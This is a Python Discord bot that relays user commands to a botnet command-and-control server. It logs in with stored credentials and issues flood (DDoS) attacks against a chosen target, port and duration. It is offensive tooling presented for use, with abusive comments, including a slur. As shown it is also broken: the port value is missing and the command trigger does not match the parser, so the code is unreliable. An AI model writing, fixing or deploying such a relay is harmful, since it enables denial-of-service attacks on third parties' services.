import os
import sys
import time
import socket
import discord

# SET THIS SHIT RETARD
host = ""
CNCport = 
username = ""
password = ""
shellprompt = ""

client = discord.Client()

async def parsetocnc(vec: str, target: str, timestamp: str, port: str):
	attack = "%s %s %s dport=%s" %(vec, target, timestamp, port) # Make the attack itself
	
	print("Parsing: %s" %(attack))

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # setup shit to connect to the cnc or whatever
	s.connect((host, CNCport)) # actually connect to the shit
	

	s.send("\r\n".encode())

	buf = s.recv(1024) 

	s.send("{}\r\n".format(username).encode()) # username
	time.sleep(1) 
	s.send("{}\r\n".format(password).encode()) # send pass
	while(True):
		buf = s.recv(1024) 
		if(shellprompt in str(buf)): 
			s.send("{}\r\n".format(attack).encode()) # send attack.
			return(True)

async def parseflood(arg: str, message): 
	try:
		attackvec = arg.split("#flood ")[1].split(" ")[0]  # get attack 
		print("Attack: %s" %(attackvec)) 
		target = arg.split(" ")[2].split(" ")[0]  # get target
		print("Target: %s" %(target))
		timesec = arg.split(" ")[3].split(" ")[0]  # get time
		print("Time: %s" %(timesec))
		port = arg.split(" ")[4].split(" ")[0]  # get port
		print("port: %s" %(port))

		if(int(timesec) <= 300): #CHANGE ATTACK TIME HERE
			await parsetocnc(attackvec, target, timesec, port)
		else:
			await message.channel.send("Attack time too long. (300 is max)")
	except(IndexError) as err: 
		await message.channel.send("wrong attack parsing! %s" %(err))
	

@client.event 
async def on_message(message): 
	print(message.content)
	if(".flood" in message.content): 
		await parseflood(message.content, message) 

client.run("") # UR DISCORD BOT TOKEN
